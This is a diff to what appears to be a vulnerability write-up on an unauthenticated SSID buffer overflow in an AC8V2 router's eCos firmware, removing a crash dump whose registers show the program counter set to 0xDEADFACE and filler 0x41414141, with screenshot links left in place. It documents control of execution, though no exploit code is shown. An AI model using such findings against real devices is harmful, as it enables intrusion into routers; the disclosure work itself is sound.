@@ -119,21 +119,6 @@ No session cookie or admin credential was required (`ecos_pw` sent empty) — th
 
 Resulting crash dump:
 
-```
-Call stack:
-Invalid Address 0xdeadface.
-
-R28   700B0000   R29   8056B448
-R30   41414141   R31   DEADFACE
-PC    DEADFACE
-
-Hi    000000f9   Lo    00E5348C
-epc   deadface
-ra    deadface
-Status: 10000403  KERNEL EXL IE
-Cause : 50000010
-BadVA : deadface
-```
 ![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/SSID-BOF/jump.png)
 ![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/SSID-BOF/exploited-reg.png)
 ![](https://yzdhzjjwtsjwhabhuksf.supabase.co/storage/v1/object/public/assets/projects/Vuln_Research/AC8V2/SSID-BOF/exploited-kernel-reg.png)
